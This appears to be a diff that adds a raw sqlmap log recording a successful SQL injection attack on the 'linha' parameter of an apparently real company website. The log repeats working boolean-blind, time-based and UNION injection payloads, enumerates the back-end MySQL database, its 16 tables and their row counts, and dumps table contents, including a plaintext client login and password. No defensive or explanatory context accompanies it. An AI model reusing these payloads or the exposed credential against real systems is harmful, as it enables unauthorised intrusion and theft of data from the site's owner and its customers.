@@ -1,0 +1,267 @@
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: linha (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: linha=(SELECT (CASE WHEN (7105=7105) THEN 97 ELSE (SELECT 7102 UNION SELECT 7640) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: linha=97 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: linha=-3320 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x48496d6e4766536448627745757459654a4b74574845714d5a5955434441587a4563454e616e7261,0x7178717871),NULL-- LOvo
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] laramove_2014
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: linha (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: linha=(SELECT (CASE WHEN (7105=7105) THEN 97 ELSE (SELECT 7102 UNION SELECT 7640) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: linha=97 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: linha=-3320 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x48496d6e4766536448627745757459654a4b74574845714d5a5955434441587a4563454e616e7261,0x7178717871),NULL-- LOvo
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: laramove_2014
+[16 tables]
++--------------------+
+| acabamentos        |
+| configuracao       |
+| detalhes           |
+| duvidas            |
+| empresa            |
+| estado             |
+| home               |
+| linhas             |
+| lojista            |
+| noticias           |
+| produtos           |
+| produtos_linhas    |
+| representantes     |
+| tbl_acesso_cliente |
+| tbl_clientes       |
+| volumes            |
++--------------------+
+
+Database: laramove_2014
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| tbl_acesso_cliente | 838     |
+| lojista            | 313     |
+| produtos           | 135     |
+| produtos_linhas    | 132     |
+| linhas             | 99      |
+| duvidas            | 27      |
+| estado             | 27      |
+| representantes     | 16      |
+| configuracao       | 3       |
+| home               | 1       |
+| tbl_clientes       | 1       |
++--------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: linha (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: linha=(SELECT (CASE WHEN (7105=7105) THEN 97 ELSE (SELECT 7102 UNION SELECT 7640) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: linha=97 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: linha=-3320 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x48496d6e4766536448627745757459654a4b74574845714d5a5955434441587a4563454e616e7261,0x7178717871),NULL-- LOvo
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: laramove_2014
+Table: tbl_clientes
+[1 entry]
++------------+----------------+------------+-------------+-------------+-------------+--------------+--------------+---------------+---------------+---------------+----------------+-----------------+------------------+------------------+----------------------+
+| ID_Cliente | Cidade_Cliente | UF_Cliente | Pwd_Cliente | CEP_Cliente | Fax_Cliente | CNPJ_Cliente | Pais_Cliente | Ativo_Cliente | Email_Cliente | Login_Cliente | Bairro_Cliente | Contato_Cliente | Endereco_Cliente | Telefone_Cliente | Razao_Social_Cliente |
++------------+----------------+------------+-------------+-------------+-------------+--------------+--------------+---------------+---------------+---------------+----------------+-----------------+------------------+------------------+----------------------+
+| 1          | NULL           | NULL       | lara123     | NULL        | NULL        | NULL         | NULL         | S             | NULL          | lara          | NULL           | NULL            | NULL             | NULL             | Lara Moveis          |
++------------+----------------+------------+-------------+-------------+-------------+--------------+--------------+---------------+---------------+---------------+----------------+-----------------+------------------+------------------+----------------------+
+
+Database: laramove_2014
+Table: configuracao
+[3 entries]
++----+--------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+------+-------------------------------------------+-----------+----------+-----------+----------+----------+------------+-----------+-----------+-----------+------------------+---------------------+---------------------+--------------+--------------+---------------+---------------+--------------------+----------------+------------------+-----------------------+---------------------+------------------+-----------------------+-------------------------+--------------------+----------------------+-----------------------------+
+| id | Idioma | TextoDuvidas                                                                                                                                                                                                                                                                                                  | DuvidasFrequentes  | Home | Ampliar                                   | LeiaMais  | BemVindo | Resposta  | Detalhes | Noticias | Destaques  | Downloads | Volume_M3 | Volume_kg | TrocarLinha      | FaleConosco         | PadroesCores        | Volume_Caixa | Volume_Total | Institucional | Volume_Altura | NossosProdutos     | Volume_Largura | MaisInformacoes  | ProdutosDaLinha       | SelecionarLinha     | Volume_Descricao | NossosConsultores     | SelecionePergunta       | Volume_Comprimento | PerguntasFrequentes  | OutrosProdutosDaLinha       |
++----+--------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+------+-------------------------------------------+-----------+----------+-----------+----------+----------+------------+-----------+-----------+-----------+------------------+---------------------+---------------------+--------------+--------------+---------------+---------------+--------------------+----------------+------------------+-----------------------+---------------------+------------------+-----------------------+-------------------------+--------------------+----------------------+-----------------------------+
+| 1  | 1      | Precisando solucionar alguma dúvida sobre nossos produtos?\r\n\r\nVocê veio ao lugar certo!\r\n\r\nAbaixo segue uma série de perguntas e respostas definidas por nossa equipe.\r\n\r\nCaso não encontre a solução para sua dúvida entre em contato conosco, teremos o maior prazer em ajuda-lo(a).            | Dúvidas Freqüentes | Home | Clique na foto para ampliar               | Leia Mais | <blank>  | Resposta  | Detalhes | Notícias | Destaques  | Downloads | M³        | Kg        | Trocar a linha   | Fale Conosco        | Cores               | Caixa        | Total        | Institucional | Altura        | Nossos Produtos    | Largura        | Mais Informações | Produtos da linha     | Selecione a linha   | Descrição        | Nossos Consultores    | Selecione uma pergunta  | Compr.             | Perguntas freqüentes | Outros produtos da linha    |
+| 2  | 2      | Do your need to clear up any doubt on our products?\r\n\r\nYou came to the right place!\r\n\r\nRefer to the questions and answers below. They were prepared by our team of professionals. \r\n\r\nIn case you do not clear up your doubt, contact us. We’ll be pleased to help you.                           | Frequent Doubts    | Home | Click on the photo to enlarge it          | Read more | <blank>  | Answers   | Details  | News     | Highlights | Downloads | M³        | KG        | Change the line  | Talk to us          | Color Patterns      | Box          | Total        | Corporate     | Height        | Our products       | Width          | NULL             | Products of the line  | Select a line       | Description      | Our Sales Consultants | Select a question       | Length             | Frequent Questions   | Other prodcuts of the line  |
+| 3  | 3      | ¿Usted necesita aclarar alguna duda sobre nuestros productos?\r\n\r\n¡Usted ha buscado el sitio correcto!\r\nHay abajo una serie de preguntas y respuestas definidas por nuestro equipo de profesionales. \r\n\r\nSi usted no encuentra  la solución para su duda, contáctenos. Será un placer ayudarle. \r\n | Dudas Frecuentes   | Home | Haga un clic sobre la foto para ampliarla | Lea más   | <blank>  | Preguntas | Detalles | Noticias | Destaques  | Downloads | M³        | Kg        | Cambiar la línea | Hable con  Nosotros | Patrones de Colores | Caja         | Total        | Institucional | Altura        | Nuestros productos | Anchura        | NULL             | Productos de la línea | Seleccione la línea | Descripción      | Nuestros Consultores  | Seleccione una pregunta | Largura            | Preguntas Frecuentes | Otros productos de la línea |
++----+--------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+------+-------------------------------------------+-----------+----------+-----------+----------+----------+------------+-----------+-----------+-----------+------------------+---------------------+---------------------+--------------+--------------+---------------+---------------+--------------------+----------------+------------------+-----------------------+---------------------+------------------+-----------------------+-------------------------+--------------------+----------------------+-----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: linha (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: linha=(SELECT (CASE WHEN (7105=7105) THEN 97 ELSE (SELECT 7102 UNION SELECT 7640) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: linha=97 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: linha=-3320 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x48496d6e4766536448627745757459654a4b74574845714d5a5955434441587a4563454e616e7261,0x7178717871),NULL-- LOvo
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: laramove_2014
+[16 tables]
++--------------------+
+| acabamentos        |
+| configuracao       |
+| detalhes           |
+| duvidas            |
+| empresa            |
+| estado             |
+| home               |
+| linhas             |
+| lojista            |
+| noticias           |
+| produtos           |
+| produtos_linhas    |
+| representantes     |
+| tbl_acesso_cliente |
+| tbl_clientes       |
+| volumes            |
++--------------------+
+
+Database: laramove_2014
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| tbl_acesso_cliente | 838     |
+| lojista            | 313     |
+| produtos           | 135     |
+| produtos_linhas    | 132     |
+| linhas             | 99      |
+| duvidas            | 27      |
+| estado             | 27      |
+| representantes     | 16      |
+| configuracao       | 3       |
+| home               | 1       |
+| tbl_clientes       | 1       |
++--------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: linha (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: linha=(SELECT (CASE WHEN (7105=7105) THEN 97 ELSE (SELECT 7102 UNION SELECT 7640) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: linha=97 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: linha=-3320 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x48496d6e4766536448627745757459654a4b74574845714d5a5955434441587a4563454e616e7261,0x7178717871),NULL-- LOvo
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: laramove_2014
+Table: home
+[1 entry]
++----------+----------+----------+----------+
+| Home_Idf | TextoIng | TextoEsp | TextoPor |
++----------+----------+----------+----------+
+| 1        | <blank>  | <blank>  | \r\n     |
++----------+----------+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: linha (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: linha=(SELECT (CASE WHEN (7105=7105) THEN 97 ELSE (SELECT 7102 UNION SELECT 7640) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: linha=97 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: linha=-3320 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x48496d6e4766536448627745757459654a4b74574845714d5a5955434441587a4563454e616e7261,0x7178717871),NULL-- LOvo
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: laramove_2014
+[16 tables]
++--------------------+
+| acabamentos        |
+| configuracao       |
+| detalhes           |
+| duvidas            |
+| empresa            |
+| estado             |
+| home               |
+| linhas             |
+| lojista            |
+| noticias           |
+| produtos           |
+| produtos_linhas    |
+| representantes     |
+| tbl_acesso_cliente |
+| tbl_clientes       |
+| volumes            |
++--------------------+
+
+Database: laramove_2014
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| tbl_acesso_cliente | 838     |
+| lojista            | 313     |
+| produtos           | 135     |
+| produtos_linhas    | 132     |
+| linhas             | 99      |
+| duvidas            | 27      |
+| estado             | 27      |
+| representantes     | 16      |
+| configuracao       | 3       |
+| home               | 1       |
+| tbl_clientes       | 1       |
++--------------------+---------+
+
